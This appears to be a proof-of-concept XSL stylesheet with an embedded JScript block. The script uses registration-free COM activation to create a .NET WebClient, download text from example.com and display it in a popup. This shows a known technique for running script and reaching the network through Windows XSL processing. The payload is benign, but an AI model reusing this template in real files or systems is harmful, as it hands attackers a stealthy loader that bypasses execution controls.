<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
		
			
	var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="System" version="4.0.0.0" publicKeyToken="B77A5C561934E089" /><clrClass clsid="{7D458845-B4B8-30CB-B2AD-FC4960FCDF81}" progid="System.Net.WebClient" threadingModel="Both" name="System.Net.WebClient" runtimeVersion="v4.0.30319" /></assembly>';
	
	try {
		var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
		ax.ManifestText = manifest;
		
		var obj = ax.CreateObject("System.Net.WebClient");
		var webstuff = obj.DownloadString("http://www.example.com");
		var a = new ActiveXObject("WScript.Shell").Popup(webstuff);
		
	} catch(e) {
		WScript.Echo("Error: " + e.message);
	}
	]]> </ms:script>
</stylesheet>